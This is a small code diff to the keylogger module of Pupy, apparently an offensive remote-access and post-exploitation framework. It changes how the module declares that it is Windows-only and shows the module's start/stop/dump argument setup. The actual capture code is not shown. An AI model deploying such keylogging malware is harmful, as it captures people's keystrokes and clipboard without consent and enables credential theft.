@@ -12,6 +12,7 @@ from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="KeyloggerModule"
 
+@compatibility("windows")
 class KeyloggerModule(PupyModule):
 	""" 
 		A keylogger to monitor all keyboards interaction including the clipboard :-)
@@ -24,10 +25,6 @@ class KeyloggerModule(PupyModule):
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog='keylogger', description=self.__doc__)
 		self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
-
-	@windows_only
-	def is_compatible(self):
-		pass
 
 	def stop_daemon(self):
 		self.success("keylogger stopped")
